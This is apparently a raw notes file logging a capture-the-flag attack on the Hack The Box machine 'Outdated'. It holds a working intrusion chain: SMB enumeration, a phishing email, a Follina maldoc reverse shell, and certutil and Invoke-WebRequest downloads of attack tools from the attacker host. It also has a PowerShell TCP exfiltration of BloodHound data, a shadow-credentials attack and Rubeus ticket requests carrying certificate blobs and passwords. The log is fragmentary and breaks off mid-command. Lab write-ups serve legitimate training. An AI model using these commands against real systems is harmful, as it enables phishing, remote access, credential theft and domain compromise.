@@ -1,0 +1,708 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -N -L //10.10.11.175                      
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Shares          Disk      
+	SYSVOL          Disk      Logon server share 
+	UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
+	WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
+	WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -N //10.10.11.175/Shares                
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Jun 20 11:01:33 2022
+  ..                                  D        0  Mon Jun 20 11:01:33 2022
+  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 11:00:32 2022
+
+		9116415 blocks of size 4096. 1406131 blocks available
+smb: \> get NOC_Reminder.pdf
+getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (614.5 KiloBytes/sec) (average 614.5 KiloBytes/sec)
+smb: \> ^C
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+Due to last week’s security breach we need to rebuild some of our core servers. This has impacted a handful of our workstations, update
+services, monitoring tools and backups. As we work to rebuild, please assist our NOC by e-mailing a link to any internal web applications to
+itsupport@outdated.htb so we can get them added back into our monitoring platform for alerts and notifications.
+We have also onboarded a new employee to our SOC to assist with this matter and expedite the recovery of our update services to ensure all
+critical vulnerabilities are patched and servers are up to date. The CVE list below is top priority, and we must ensure that these are patched
+ASAP.
+Thank you in advance for your assistance. If you have any questions, please reach out to the mailing list above.
+CVE-2022-30190
+CVE ID
+Type
+Exec CodePublish Date
+2022-06-01Score
+9.3Access
+RemoteComplexity
+Medium
+Description
+Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code
+Execution Vulnerability.
+Windows Print Spooler Elevation of Privilege Vulnerability.
+CVE-2022-30138Exec Code2022-05-187.2LocalLowCVE-2022-30129Exec Code2022-05-106.8RemoteMediumVisual Studio Code Remote Code Execution Vulnerability.
+CVE-2022-29130Exec Code2022-05-109.3RemoteMediumWindows LDAP Remote Code Execution Vulnerability.
+CVE-2022-29110Exec Code2022-05-109.3RemoteMediumMicrosoft Excel Remote Code Execution Vulnerability
+
+
+"Moreover, the email address itsupport@outdated.htb is alluded to, which is particularly interesting since
+the first vulnerability mentioned in the document is CVE-2022-30190 , also known as Follina, a recent
+exploit on MS word/rtf docs, which is in part exploitable through email. The vulnerability is based on the
+Microsoft Support Diagnostics Tool- MSDT , which can be used to download malicious files via an embedded
+link."
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# swaks --to itsupport@outdated.htb --from car@melo --server mail.outdated.htb --body "http://10.10.14.9/"
+=== Trying mail.outdated.htb:25...
+=== Connected to mail.outdated.htb.
+<-  220 mail.outdated.htb ESMTP
+ -> EHLO kali
+<-  250-mail.outdated.htb
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> MAIL FROM:<car@melo>
+<-  250 OK
+ -> RCPT TO:<itsupport@outdated.htb>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> Date: Tue, 14 Oct 2025 07:27:16 -0400
+ -> To: itsupport@outdated.htb
+ -> From: car@melo
+ -> Subject: test Tue, 14 Oct 2025 07:27:16 -0400
+ -> Message-Id: <20251014072716.044531@kali>
+ -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -> 
+ -> http://10.10.14.9/
+ -> 
+ -> 
+ -> .
+<-  250 Queued (10.531 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+                                                                                                                    
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 8000 --directory /usr/share/windows-resources/binaries
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.175 - - [14/Oct/2025 07:27:49] "GET /nc.exe HTTP/1.1" 200 -
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 follina.py --interface tun0 --port 80 --reverse 4444
+[+] copied staging doc /tmp/9yp9eyfr
+[+] created maldoc ./follina.doc
+[+] serving html payload on :80
+[+] starting 'nc -lvnp 4444' 
+listening on [any] 4444 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.175] 49845
+Microsoft Windows [Version 10.0.19043.928]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\btables\AppData\Local\Temp\SDIAG_a8175e44-9f91-44a0-9295-325fd185c2b1>
+
+C:\Users\btables>powershell.exe
+powershell.exe
+whoamiWindows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\btables> 
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 8000 --directory /usr/share/sharphound/   
+
+PS C:\Users\Public> certutil -urlcache -f http://10.10.14.9:8000/SharpHound.exe C:\Users\Public\sh.exe
+certutil -urlcache -f http://10.10.14.9:8000/SharpHound.exe C:\Users\Public\sh.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\Public> dir
+dir
+
+
+    Directory: C:\Users\Public
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-r---         6/15/2022   9:20 AM                Documents                                                            
+d-r---         12/7/2019   1:14 AM                Downloads                                                            
+d-r---         12/7/2019   1:14 AM                Music                                                                
+d-r---         12/7/2019   1:14 AM                Pictures                                                             
+d-r---         12/7/2019   1:14 AM                Videos                                                               
+-a----        10/14/2025  12:39 PM        1308672 sh.exe                                                               
+
+
+PS C:\Users\Public> 
+
+
+PS C:\Users\Public> ./sh.exe -C All
+
+
+PS C:\Users\Public> $client = New-Object System.Net.Sockets.TCPClient('10.10.14.9',9001)
+$stream = $client.GetStream()
+$bytes = [System.IO.File]::ReadAllBytes('C:\Users\Public\20251014124115_BloodHound.zip')
+$stream.Write($bytes,0,$bytes.Length)
+$stream.Close(); $client.Close()$client = New-Object System.Net.Sockets.TCPClient('10.10.14.9',9001)
+PS C:\Users\Public> $stream = $client.GetStream()
+PS C:\Users\Public> $bytes = [System.IO.File]::ReadAllBytes('C:\Users\Public\20251014124115_BloodHound.zip')
+PS C:\Users\Public> $stream.Write($bytes,0,$bytes.Length)
+PS C:\Users\Public> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvp 9001 > outdated_Bloodhound.zip
+listening on [any] 9001 ...
+connect to [10.10.14.9] from outdated.htb [10.10.11.175] 49833
+
+
+The members of the group ITSTAFF@OUTDATED.HTB have the ability to write to the "msds-KeyCredentialLink" property on SFLOWERS@OUTDATED.HTB. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.
+
+
+0.14.9:8000/Invoke-Whisker.ps1 C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7\Invoke-Whisker.ps1
+certutil -urlcache -f http://10.10.14.9:8000/Invoke-Whisker.ps1 C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7\Invoke-Whisker.ps1
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7>
+
+
+Need one of the following to work.
+
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+
+. C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7\Invoke-Whisker.ps1
+Invoke-Whisker -command "add /target:sflowers"
+
+powershell -ExecutionPolicy Bypass -File C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7\Invoke-Whisker.ps1
+
+
+S C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7> . C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7\Invoke-Whisker.ps1
+Invoke-Whisker -command "add /target:sflowers". C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7\Invoke-Whisker.ps1
+PS C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7> 
+Invoke-Whisker -command "add /target:sflowers"
+[*] No path was provided. The certificate will be printed as a Base64 blob
+[*] No pass was provided. The certificate will be stored with the password zJi7rMeNts5Zxa6m
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID 4ce19193-9103-4631-bbc5-f43b1ed77824
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:sflowers /certificate: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 /password:"zJi7rMeNts5Zxa6m" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+
+PS C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7> 
+
+
+"The final section of the condensed output is a Rubeus command, which is another tool with which we can
+get a Golden Ticket for this domain. In summary, a Golden Ticket attack targets the Active Directory Key
+Distribution Service Account (KRBTGT), essentially using that account to forge valid Ticket Granting Tickets
+(TGTs), which in turn give the attacker access to any resource on that domain. The intricacies of Active
+Directory are far too many to cover in a single writeup, however, further reading on the subject is highly
+recommended, and a great place to start is the Introduction to Active Directory Academy module.
+We proceed by uploading the Rubeus binary, using the same iwr methods as before, and can then copy-
+paste the command directly out of the Whisker output. While Whisker generated a new certificate for us
+and appended that to sflowers ' msDS-KeyCredentialLink attribute, Rubeus will now leverage that to get
+us the TGT of that same user."
+
+
+PS C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7> Invoke-WebRequest -Uri "http://10.10.14.9:8000/Rubeus.exe" -OutFile "C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7\Rubeus.exe"
+Invoke-WebRequest -Uri "http://10.10.14.9:8000/Rubeus.exe" -OutFile "C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7\Rubeus.exe"
+PS C:\Users\btables\AppData\Local\Temp\SDIAG_ebd681c8-1b6e-435e-aaaf-bae0ed8daac7>
+
+
+
+again....
+
+
+PS C:\Users\Public> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+PS C:\Users\Public> . .\Invoke-Whisker.ps1
+. .\Invoke-Whisker.ps1
+PS C:\Users\Public> Invoke-Whisker -command "add /target:sflowers"
+Invoke-Whisker -command "add /target:sflowers"
+[*] No path was provided. The certificate will be printed as a Base64 blob
+[*] No pass was provided. The certificate will be stored with the password j2fSqqWwDeWr1cV2
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID a7cb7ec4-f053-4568-9c1b-2145c331e6f5
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAh28/qVHvUwGgICB9AEggTYlNGeJAcUNEfaOP398ORQBYsbdRrv4DP4FGt/rvp3eEwW0IdZj3Egsro2ixlMT4y49duDultNZE+WwwSGmpJ4Q1DFoGAUMHDpIfj+kKPMPy2gZqu3tNp3/IArFMDoHA9cIl+IaI8tcYgdkQlXYpMfEQ7MccUVLsRCS966bFdIMw5EUuAGpQcl1Z3Vy2UbrFhWccVjp6EPfnmSsFBX1OX5repFpyXW17T98klB/iccm2v0P1igfyloxX2VhdRqBBjp/HUcGjq6FTDQdeF0HLKJVoGQTl6nr2MhnrqA8jiujD3ob+WCs9rqTFGf/MN+MkoaLf0rTBdVYk46Xj2+55tRd0d+3X1EOGW5IzEhPoi30P/+QlvNg2otkRmMpVX3X3sG6X5E0U7aD5vwr20lFg3SsxenPvdq/i8YfY3rZg814xwjVvI4epVCFJp1d8A9HAcBnT+cdFG0hG00sYSL7vszfBDdDXBoZizyj1PZizZ1avqepZ9u0c6gL4iijB5nok92Ugd+74aIEi/3lOS9Z9FH4yMotGnEFH0Uh6OUFH/d5xWtYx6+G+g2RyzzAWqVlnF12g/N+tSNP5yAmhEQqvyxuNB22HpYohW+z5/m7YdTVbslzcEDEAuWkW8z6kBB9sqmYqRG9vY1yY5kklvTqKlbVfChbYQJjalSeeTlZ7GFhG5jOxfw0uDCNq46ABCbb2dHJHt1uVJNJDvZHXE6mbywRFIZevqcsl1gBDTN1bRUTY1iMPdRf+XMwJdxMmzIzsYrGOhKynFhJw0TzHfpxJyDcazHE5Doohziu30KXiDX2cFQvUpnENdIMPIik5TeM0KYGvlA56GSa5JWB/o5idWfOaB/P0nbt9W8nNC4Z9JexpR7zI2ZMBOktxY/iGawgLj2HbL56ZS78P1Ctdfmpe7QwBdX/mHLdl/yZtQxwgy81UnwrfAsPlyP2NCut/gNXlAg7EtVJDpsEW1ZZKFlszbBg4Yy+BugoUOq5ZE3B4p20XyymDGXxdTKUBcM3BpFBfCXs0lrYacKy6hOJ1NA/yeHzxH2uCKrs36K0hzls23jmkqCUgTCkOiwGfgEtS5CGGVDS8l5tZY9ZxTSppC4E8Tdn2om4Ol9ISXWNN2hHpri8vhNCd06tnQZeGmJnyYOJOM3o+zCxz/7LKoHhgAN+8RYgWqBeL/o8GOaRvym5H8HgxeXE1b9Klg/g2sEBD6G2EHE7jZlHYpOCnU9J9qh1lK4UyTBv4IFdgpdNz/m2DrSretaaDX1V8gJw1f2qnpqw9TFbmpWMdDeWcsq7IcsjcCl+6Hq66k9fXl2bBGXoYKcrXC1b91Fpu2aLWaI90T+NQ9Vf23ngY+5gFWWlAQJuA4Rk9SLJffoeDAu9Nc7ihHUQc3iSRSVQECWq1McIqjFzG5gEoUNU6VqH0oqGbVw7LN8PRqrFMdjnSquJJl3atmMTEqe8CowvTSqziMzPPcVZRFnfuJ9XTjLgTz0JW0AYHXtpzlndMp2CQXCE0zaUayhteY/hZLAjvNe8ROigqZY5W1cuktjOCkLiu8AxeMT7BLrWcgPH248qNYh8qSB/krGzXfhKEiAU23+CGGGdr30VrVgLMoSw122jardQJPu1laPgNK3qwPDHCD7NRUpMa8fvTuPDFMWSRD3LTGB6TATBgkqhkiG9w0BCRUxBgQEAQAAADBXBgkqhkiG9w0BCRQxSh5IADYANwA5ADEAYQA4ADkANwAtADEAZgAzAGQALQA0AGMAMAAxAC0AYQAyAGQAYwAtADAAYQA5AGQAZgBmAGUANQA4ADgAMQBiMHkGCSsGAQQBgjcRATFsHmoATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByMIIDPwYJKoZIhvcNAQcGoIIDMDCCAywCAQAwggMlBgkqhkiG9w0BBwEwHAYKKoZIhvcNAQwBAzAOBAgl6izbq28T9gICB9CAggL4ECwxJX2Y+Popr5GQrDUeD9W3BlGrC05C+8ZyTVl/uGG2BiHfnOeevGmjm26u1IQGHJJYZdeS9HIoPzJQPbUaR5zJn5Xri5nRgaIvp3gGOFQcyWhbHe7FSdgujmKCv5GX7/Hdy29/4c0Zx7eZQFYItAvN5aTOEoA4vdwdgnpjVu0Ai7//d+jzklHCEPxCPdRsrnXfEHFL0esXC4wbRqavldbXXpDsRXDiy7S2KXVprXSXX5zYCSMElpQTAruT//I6r7eYLzVl2lJMZeDRCNeSwhJetAfI6GvrLuhuOTEhocODCDvpc8H/XzrkLtaGAT+o/5hb6b/KbvQACkyCTL+M2jInc/pgm6F8k9LzGhuJFiamGsnaue8SRnmu0AdubFkglEOvd+q3ZJYLT6UCu2mLrup0rH4o+0UYunhrvhztMRSmxLETAAWIKzgT4M+pQKrEwHMZwBtgO0W2sDJPb+TgUS0WcILDmDOzC7by7l/t3HfPm3Q4zTiVvUT97s2sBN7VUS3QGO9diZrhzPDJzdryd8EEkLrw1NG0v/YGfXGhrshoWvC7p3FVcOoCkjZyzCqiwUYP8SmWfuqJsY3W4x6B4gzF9wbct2alN3xqKYPE3yj9cDPWHQI6NIEwGZZfaOWHcStxZ3MeiZgJskgTuxWY8LHmJdUnpCYdAAw0hpvk1pUBX1qyafNhB2M0fj7hU6ZJUeMEdSw0f9WFCerHzJ/h/VPwMb2AunsFTg6WrJMjNvLS5VoUG1Ef+AkGpfMKEsRzrLf5x9oaTGo+/oA6nNSJvWp7D3buQdzNZ/KnjSh7iJtor9GynKa0sNM8HW4gwPGRwX+ImTK6tLAdER6dwcJAuraLMQ62G/rP23eD74QRH5/ehZHRuGHgK0I3oSSZ+bB5kc3p7qD/LGw5S8xf5Oizbjh9HiNR+CzGIDqfMJszds0rE0yswUARqD8u5F3LMBgfMNv1ErDnfyEqLcUH/91Gd/PDkYLSRyGZWy9gEANNChdDRHL+X37fXzA7MB8wBwYFKw4DAhoEFBF7Zd6ViSdnAcaVwvJ77yb+4OJZBBRFo9awLtLa7V+7fhpuVuCLfbIDOwICB9A= /password:"j2fSqqWwDeWr1cV2" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+
+PS C:\Users\Public> .\Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAh28/qVHvUwGgICB9AEggTYlNGeJAcUNEfaOP398ORQBYsbdRrv4DP4FGt/rvp3eEwW0IdZj3Egsro2ixlMT4y49duDultNZE+WwwSGmpJ4Q1DFoGAUMHDpIfj+kKPMPy2gZqu3tNp3/IArFMDoHA9cIl+IaI8tcYgdkQlXYpMfEQ7MccUVLsRCS966bFdIMw5EUuAGpQcl1Z3Vy2UbrFhWccVjp6EPfnmSsFBX1OX5repFpyXW17T98klB/iccm2v0P1igfyloxX2VhdRqBBjp/HUcGjq6FTDQdeF0HLKJVoGQTl6nr2MhnrqA8jiujD3ob+WCs9rqTFGf/MN+MkoaLf0rTBdVYk46Xj2+55tRd0d+3X1EOGW5IzEhPoi30P/+QlvNg2otkRmMpVX3X3sG6X5E0U7aD5vwr20lFg3SsxenPvdq/i8YfY3rZg814xwjVvI4epVCFJp1d8A9HAcBnT+cdFG0hG00sYSL7vszfBDdDXBoZizyj1PZizZ1avqepZ9u0c6gL4iijB5nok92Ugd+74aIEi/3lOS9Z9FH4yMotGnEFH0Uh6OUFH/d5xWtYx6+G+g2RyzzAWqVlnF12g/N+tSNP5yAmhEQqvyxuNB22HpYohW+z5/m7YdTVbslzcEDEAuWkW8z6kBB9sqmYqRG9vY1yY5kklvTqKlbVfChbYQJjalSeeTlZ7GFhG5jOxfw0uDCNq46ABCbb2dHJHt1uVJNJDvZHXE6mbywRFIZevqcsl1gBDTN1bRUTY1iMPdRf+XMwJdxMmzIzsYrGOhKynFhJw0TzHfpxJyDcazHE5Doohziu30KXiDX2cFQvUpnENdIMPIik5TeM0KYGvlA56GSa5JWB/o5idWfOaB/P0nbt9W8nNC4Z9JexpR7zI2ZMBOktxY/iGawgLj2HbL56ZS78P1Ctdfmpe7QwBdX/mHLdl/yZtQxwgy81UnwrfAsPlyP2NCut/gNXlAg7EtVJDpsEW1ZZKFlszbBg4Yy+BugoUOq5ZE3B4p20XyymDGXxdTKUBcM3BpFBfCXs0lrYacKy6hOJ1NA/yeHzxH2uCKrs36K0hzls23jmkqCUgTCkOiwGfgEtS5CGGVDS8l5tZY9ZxTSppC4E8Tdn2om4Ol9ISXWNN2hHpri8vhNCd06tnQZeGmJnyYOJOM3o+zCxz/7LKoHhgAN+8RYgWqBeL/o8GOaRvym5H8HgxeXE1b9Klg/g2sEBD6G2EHE7jZlHYpOCnU9J9qh1lK4UyTBv4IFdgpdNz/m2DrSretaaDX1V8gJw1f2qnpqw9TFbmpWMdDeWcsq7IcsjcCl+6Hq66k9fXl2bBGXoYKcrXC1b91Fpu2aLWaI90T+NQ9Vf23ngY+5gFWWlAQJuA4Rk9SLJffoeDAu9Nc7ihHUQc3iSRSVQECWq1McIqjFzG5gEoUNU6VqH0oqGbVw7LN8PRqrFMdjnSquJJl3atmMTEqe8CowvTSqziMzPPcVZRFnfuJ9XTjLgTz0JW0AYHXtpzlndMp2CQXCE0zaUayhteY/hZLAjvNe8ROigqZY5W1cuktjOCkLiu8AxeMT7BLrWcgPH248qNYh8qSB/krGzXfhKEiAU23+CGGGdr30VrVgLMoSw122jardQJPu1laPgNK3qwPDHCD7NRUpMa8fvTuPDFMWSRD3LTGB6TATBgkqhkiG9w0BCRUxBgQEAQAAADBXBgkqhkiG9w0BCRQxSh5IADYANwA5ADEAYQA4ADkANwAtADEAZgAzAGQALQA0AGMAMAAxAC0AYQAyAGQAYwAtADAAYQA5AGQAZgBmAGUANQA4ADgAMQBiMHkGCSsGAQQBgjcRATFsHmoATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByMIIDPwYJKoZIhvcNAQcGoIIDMDCCAywCAQAwggMlBgkqhkiG9w0BBwEwHAYKKoZIhvcNAQwBAzAOBAgl6izbq28T9gICB9CAggL4ECwxJX2Y+Popr5GQrDUeD9W3BlGrC05C+8ZyTVl/uGG2BiHfnOeevGmjm26u1IQGHJJYZdeS9HIoPzJQPbUaR5zJn5Xri5nRgaIvp3gGOFQcyWhbHe7FSdgujmKCv5GX7/Hdy29/4c0Zx7eZQFYItAvN5aTOEoA4vdwdgnpjVu0Ai7//d+jzklHCEPxCPdRsrnXfEHFL0esXC4wbRqavldbXXpDsRXDiy7S2KXVprXSXX5zYCSMElpQTAruT//I6r7eYLzVl2lJMZeDRCNeSwhJetAfI6GvrLuhuOTEhocODCDvpc8H/XzrkLtaGAT+o/5hb6b/KbvQACkyCTL+M2jInc/pgm6F8k9LzGhuJFiamGsnaue8SRnmu0AdubFkglEOvd+q3ZJYLT6UCu2mLrup0rH4o+0UYunhrvhztMRSmxLETAAWIKzgT4M+